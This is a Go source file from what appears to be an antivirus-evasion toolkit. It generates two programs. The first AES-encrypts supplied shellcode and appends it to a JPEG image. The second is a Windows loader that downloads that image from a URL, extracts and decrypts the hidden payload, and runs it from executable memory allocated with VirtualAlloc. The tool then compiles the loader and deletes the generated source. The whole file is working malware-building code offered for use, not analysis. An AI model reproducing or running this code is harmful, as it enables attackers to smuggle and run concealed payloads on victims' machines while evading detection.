package service

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
)

func AES_GO_separate(shellcode string, fileName string) {
	fmt.Println("AES_GO_separate")
	aesKey := RandomString(16)
	func(shellcde string) {
		code := "package main\n\nimport (\n\t\"bytes\"\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\nconst (\n\tStdLen  = 16\n\tUUIDLen = 20\n\tiv      = \"0000000000000000\"\n)\n\nvar StdChars = []byte(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\")\n\nfunc Get_aes_key() []byte {\n\treturn NewLenChars(StdLen, StdChars)\n}\n\nfunc NewLenChars(length int, chars []byte) []byte {\n\tif length == 0 {\n\t\t_ = 1\n\t}\n\tclen := len(chars)\n\tif clen < 2 || clen > 256 {\n\t\tpanic(\"Wrong charset length for NewLenChars()\")\n\t}\n\tmaxrb := 255 - (256 % clen)\n\tb := make([]byte, length)\n\tr := make([]byte, length+(length/4))\n\ti := 0\n\tfor {\n\t\tif _, err := rand.Read(r); err != nil {\n\t\t\tpanic(\"Error reading random bytes: \" + err.Error())\n\t\t}\n\t\tfor _, rb := range r {\n\t\t\tc := int(rb)\n\t\t\tif c > maxrb {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tb[i] = chars[c%clen]\n\t\t\ti++\n\t\t\tif i == length {\n\t\t\t\treturn b\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc PKCS5Padding(ciphertext []byte, blockSize int) []byte {\n\tpadding := blockSize - len(ciphertext)%blockSize\n\tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n\treturn append(ciphertext, padtext...)\n}\n\nfunc PKCS5UnPadding(origData []byte) []byte {\n\tlength := len(origData)\n\tunpadding := int(origData[length-1])\n\treturn origData[:(length - unpadding)]\n}\nfunc AesDecrypt(decodeStr string, key []byte) ([]byte, error) {\n\tdecodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblockMode := cipher.NewCBCDecrypter(block, []byte(iv))\n\torigData := make([]byte, len(decodeBytes))\n\n\tblockMode.CryptBlocks(origData, decodeBytes)\n\torigData = PKCS5UnPadding(origData)\n\treturn origData, nil\n}\n\nfunc AesEncrypt(encodeBytes []byte, key []byte) (string, error) {\n\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tblockSize := block.BlockSize()\n\tfmt.Println(blockSize)\n\tencodeBytes = PKCS5Padding(encodeBytes, blockSize)\n\tblockMode := cipher.NewCBCEncrypter(block, []byte(iv))\n\tcrypted := make([]byte, len(encodeBytes))\n\tblockMode.CryptBlocks(crypted, encodeBytes)\n\treturn base64.StdEncoding.EncodeToString(crypted), nil\n}\nfunc WriteFile(aes string) {\n\tvar f *os.File\n\tfilename := \"./shellcode.txt\"\n\tf, _ = os.Create(filename)\n\tdefer f.Close()\n\t_, err := f.Write([]byte(aes))\n\tif err != nil {\n\t\treturn\n\t}\n}\nfunc WriteImage(aes string) {\n\tfname := \"F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/a.jpg\"\n\tcontent, err := ioutil.ReadFile(fname)\n\terr1 := ioutil.WriteFile(\"./a.jpg\", content, 0666)\n\tif err1 != nil {\n\t\tfmt.Println(\"write file failed, err:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"%#v\", content)\n\tif err != nil {\n\t\tfmt.Printf(\"open file faild,err:%s\\n\", err)\n\t\treturn\n\t}\n\tf, err := os.OpenFile(\"./a.jpg\", os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tf.WriteString(aes)\n\tf.Close()\n\tfmt.Println(\"写入成功!\")\n}\n\nfunc main() {\n\tvar payload = []byte{" + shellcode + "}\n\tkey := \"" + aesKey + "\"\n\tb, _ := AesEncrypt([]byte(payload), []byte(key))\n\tb = b + \"" + aesKey + "\"\n\tWriteFile(b)\n\tWriteImage(b)\n\n}"
		loader := "package main\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\t\"syscall\"\n\t\"unsafe\"\n)\n\nconst (\n\tMEM_COMMIT    = 0x1000\n\tMEM_RESERVE            = 0x2000\n\tPAGE_EXECUTE_READWRITE = 0x40\n)\n\nvar iv = \"0000000000000000\"\n\nvar (\n\tkernel32      = syscall.MustLoadDLL(\"kernel32.dll\")\n\tntdll         = syscall.MustLoadDLL(\"ntdll.dll\")\n\tVirtualAlloc  = kernel32.MustFindProc(\"VirtualAlloc\")\n\tRtlCopyMemory = ntdll.MustFindProc(\"RtlCopyMemory\")\n)\n\nfunc PKCS5UnPadding(origData []byte) []byte {\n\tlength := len(origData)\n\tunpadding := int(origData[length-1])\n\treturn origData[:(length - unpadding)]\n}\n\nfunc AesDecrypt(decodeStr string, key []byte) ([]byte, error) {\n\tdecodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tblockMode := cipher.NewCBCDecrypter(block, []byte(iv))\n\torigData := make([]byte, len(decodeBytes))\n\n\tblockMode.CryptBlocks(origData, decodeBytes)\n\torigData = PKCS5UnPadding(origData)\n\treturn origData, nil\n}\n\nfunc main() {\n\tencodeString := \"\"\n\targ1 := os.Args[1] // imageURL := \"http://127.0.0.1:8000/1.jpg\"\n\tif strings.Contains(arg1, \"http\") {\n\t\tresp, err := http.Get(arg1)\n\t\tif err != nil {\n\t\t\tos.Exit(1)\n\t\t}\n\t\tb, err := ioutil.ReadAll(resp.Body)\n\t\tresp.Body.Close()\n\t\tif err != nil {\n\t\t\tos.Exit(1)\n\t\t}\n\t\tidx := 0\n\t\tb = []byte(b)\n\t\tfor i := 0; i < len(b); i++ {\n\t\t\tif b[i] == 255 && b[i+1] == 217 {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tidx++\n\t\t}\n\t\tencodeString = string(b[idx+2:])\n\t} else if strings.Contains(arg1, \"" + aesKey + "\") {\n\t\tencodeString = arg1\n\t} else {\n\t\tfmt.Println(\"a\")\n\t}\n\t//获取到aes加密的shellcode qaeasdzxc1qazxsw\n\tvar enc_key1 = \"" + aesKey[:4] + "\"\n\tvar enc_key2 = \"" + aesKey[4:10] + "\"\n\tvar enc_key3 = \"" + aesKey[10:] + "\"\n\n\tsc, _ := AesDecrypt(encodeString[:len(encodeString)-16], []byte(enc_key1+enc_key2+enc_key3))\n\taddr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n\tif err != nil && err.Error() != \"The operation completed successfully.\" {\n\t\tsyscall.Exit(0)\n\t}\n\t_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))\n\tif err != nil && err.Error() != \"The operation completed successfully.\" {\n\t\tsyscall.Exit(0)\n\t}\n\tsyscall.Syscall(addr, 0, 0, 0, 0)\n}"
		fileObjCode, err1 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644) // /aes1/aes/main.go
		if err1 != nil {
			fmt.Println("打开文件出错了:", err1)
			return
		}
		wrCode := bufio.NewWriter(fileObjCode)
		wrCode.WriteString(code)
		wrCode.Flush()
		defer fileObjCode.Close()
		fileObjLoader, err2 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644) // /aes1/aes/main.go
		if err2 != nil {
			fmt.Println("打开文件出错了:", err2)
			return
		}
		wrLoader := bufio.NewWriter(fileObjLoader)
		wrLoader.WriteString(loader)
		wrLoader.Flush()
		defer fileObjCode.Close()
	}(shellcode)
	exec.Command("go", "run", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go").Run()
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/code/main.go")
	exec.Command("python", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/service/executable/compile.py", "-w", "AES_GO_separate", "-f", fileName).Run() //, "-ldflags=\"-H", "windowsgui\""
	Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go")
}
